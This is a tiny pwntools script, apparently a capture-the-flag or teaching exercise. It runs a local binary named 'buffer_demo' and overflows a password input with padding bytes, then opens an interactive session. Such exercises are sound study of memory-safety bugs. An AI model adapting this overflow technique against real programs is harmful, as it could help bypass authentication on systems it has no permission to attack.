from pwn import *

p = process('./buffer_demo')

payload = b'y'  # answer the question :)
payload += b'A' * 0x9
p.sendlineafter(b'password: ', payload)

p.interactive()
p.close()